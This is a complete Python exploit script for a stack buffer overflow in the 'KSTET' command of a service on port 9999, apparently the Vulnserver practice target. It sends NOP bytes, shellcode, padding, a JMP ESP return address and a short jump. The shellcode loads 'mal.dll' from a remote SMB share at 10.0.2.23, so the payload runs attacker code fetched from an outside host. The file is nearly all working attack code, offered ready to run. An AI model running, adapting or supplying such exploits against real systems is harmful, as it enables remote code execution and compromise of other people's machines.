#! /bin/python3

import socket   # The module "socket" provides access to the BSD socket interface
import struct   # The module "struct" performs conversions between Python values and C structs represented as Python bytes objects.
import sys      # The module "sys" provides access to the runtime environment and allows us to gather information about it.

# Check that we have a target IP
if (len(sys.argv) < 2):
    print("This program requires one Command Line Argument. This should be the IPv4 address of the target machine")
    exit(1)

# Set Constants for later use
HOST = sys.argv[1]  # Extract target IP
PORT = 9999         # victim port

SHELL_LIB = (
b'\x83\xec\x64\x31\xdb\x53\x68\x2e\x64\x6c\x6c\x68\x5c\x6d\x61\x6c\x68\x61\x62\x63\x64\x68\x2e\x32\x33\x5c\x68\x2e\x30\x2e\x32\x68\x5c\x5c\x31\x30\x54\xbb\xc0\x0d\x47\x76\xff\xd3'
)

PAYLOAD = (
    b'KSTET ' +
    b'\x90' * 2 +
    SHELL_LIB +
    b'A' * (58 - len(SHELL_LIB) - 2) +
    # JMP ESP
    struct.pack('<L', 0x625026D3) +
    # JMP SHORT
    b'\xeb\xc2' +
    b'C' * (24)
)

with socket.create_connection((HOST, PORT)) as fd:
    print('Sending payload...')
    fd.sendall(PAYLOAD)
    print('Done.')
